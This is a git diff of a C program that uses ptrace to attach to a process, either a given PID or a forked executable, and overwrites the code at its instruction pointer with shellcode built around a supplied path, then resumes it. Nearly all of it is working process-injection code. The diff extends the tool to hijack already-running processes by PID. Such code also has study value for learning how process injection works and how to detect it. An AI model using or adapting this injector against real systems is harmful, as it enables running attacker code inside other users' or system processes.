@@ -25,10 +25,12 @@
  * SOFTWARE.
  */
 
-//#define __DEBUG__
+#define __OUTPUT__
 
-#ifdef __DEBUG__
-#  include<stdio.h> // to be commented out on commit
+#ifdef __OUTPUT__
+#  include<stdio.h>
+#  define INFO "\033[34m[+]\033[0m"
+#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [.BIN/EXECUTABLE]\n", X); exit(1);
 #endif
 
 #define __GNU_SOURCE
@@ -41,7 +43,8 @@
 #include<sys/wait.h> /* waitpid() */
 #include<unistd.h>
 
-#if defined(__x86_64) // amd64
+// X64
+#if defined(__x86_64)
 #  define OFFSET -1
 #  define IP_REG RIP
 #  define PTR_T u_int64_t
@@ -77,16 +80,15 @@ static u_int8_t base_shellcode[] = {
 //#  define PTR_T u_int32_t
 
 #else
-  #error unsupported architecture
+#  error unsupported architecture
 #endif
 
-void child()
+u_int8_t child(char *pathname)
 {
   //printf("Child is executing...");
-  char *child_argv[] = {"/bin/htop", 0};
+  char *child_argv[] = {pathname, 0};
   char *child_envp[] = {0};
   int ret = execve(child_argv[0], child_argv, child_envp);
-  //printf("Child finished execution");
   exit(ret);
 }
 
@@ -107,25 +109,44 @@ PTR_T get_ip_reg(pid_t pid)
 int main(int argc, char *argv[])
 {
 
+  pid_t pid;
   char *pathname;
-  if(argc != 2)
+
+  if(argc == 3)
   {
-    pathname = "./a.out";
+
+    // handling argv[1]
+
+    char *str;
+    long nr = strtol(argv[1], &str, 10);
+
+    if(strlen(str) == 0)
+    {
+      // argv[1] is PID
+      pid = (pid_t)nr;
+    } else
+    {
+      // argv[1] is pathname
+      // fork() and get PID
+      pid = fork();
+
+      if(pid == 0)
+      {
+        child(argv[1]);
+      }
+    }
+
+    // handling argv[2]
+    pathname = argv[2];
+
   } else
   {
-    pathname = argv[1];
+    HELP(argv[0]);
   }
 
-  pid_t pid = fork();
-
-  if(pid == 0)
-  {
-    child();
-  }
-  else if(pid < 0)
-  {
-    return -1;
-  }
+  #ifdef __OUTPUT__
+    printf("%s Child PID: %i\n", INFO, pid);
+  #endif
 
   attach(pid);
 
@@ -133,8 +154,8 @@ int main(int argc, char *argv[])
 
   size_t shellcode_size = strlen(base_shellcode) + strlen(pathname);
 
-  #ifdef __DEBUG__
-  printf("Shellcode size: %i\n", shellcode_size);
+  #ifdef __OUTPUT__
+  printf("%s Shellcode size: %i\n", INFO, shellcode_size);
   #endif
 
   u_int8_t shellcode[shellcode_size];
@@ -145,8 +166,8 @@ int main(int argc, char *argv[])
 
   for(int i = 0; i < sizeof(shellcode); i++, ip++)
   {
-    #ifdef __DEBUG__
-    printf("0x%04x\t%c\t> %p\n", shellcode[i], shellcode[i], ip);
+    #ifdef __OUTPUT__
+    printf("%s 0x%04x\t%c\t> %p\n", INFO, shellcode[i], shellcode[i], ip);
     #endif
 
     ptrace(PTRACE_POKETEXT, pid, ip, shellcode[i]);
@@ -154,8 +175,20 @@ int main(int argc, char *argv[])
 
   ptrace(PTRACE_CONT, pid, 0, 0);
 
-  #ifdef __DEBUG__
-  perror("Status");
+  #ifdef __OUTPUT__
+
+  int status;
+  waitpid(pid, &status, 0);
+
+  printf("%s Child status from waitpid: %i\n", INFO, status);
+  while(1)
+  {
+    if(WIFEXITED(status))
+    {
+      printf("Child exit status: %i\n", WEXITSTATUS(status));
+      exit(0);
+    }
+  }
   #endif
 
   return 0;
